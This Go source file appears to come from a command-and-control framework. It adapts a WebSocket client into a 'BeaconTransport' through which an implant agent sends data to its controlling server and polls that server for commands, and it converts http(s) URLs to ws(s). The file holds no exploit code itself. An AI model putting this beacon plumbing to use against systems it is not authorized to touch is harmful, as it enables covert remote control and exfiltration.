package main

import (
	"fmt"
	"strings"

	"github.com/mjopsec/taburtuaiC2/pkg/transport"
)

// wsAdapter wraps transport.WSClient to satisfy BeaconTransport.
type wsAdapter struct{ c *transport.WSClient }

func (w *wsAdapter) SendData(payload []byte) error { return w.c.SendData(payload) }
func (w *wsAdapter) PollCommand() ([]byte, error)  { return w.c.PollCommand() }

// newWSTransport dials the WebSocket endpoint derived from serverURL.
// Converts http(s):// to ws(s):// and appends the /ws path.
func newWSTransport(serverURL, agentID string) (BeaconTransport, error) {
	wsURL := httpToWS(serverURL)
	if !strings.HasSuffix(wsURL, "/ws") {
		wsURL = strings.TrimRight(wsURL, "/") + "/ws"
	}
	c, err := transport.NewWSClient(wsURL, agentID)
	if err != nil {
		return nil, fmt.Errorf("WebSocket transport: %w", err)
	}
	return &wsAdapter{c: c}, nil
}

// httpToWS converts http:// → ws:// and https:// → wss://.
func httpToWS(u string) string {
	switch {
	case strings.HasPrefix(u, "https://"):
		return "wss://" + u[len("https://"):]
	case strings.HasPrefix(u, "http://"):
		return "ws://" + u[len("http://"):]
	default:
		return u
	}
}
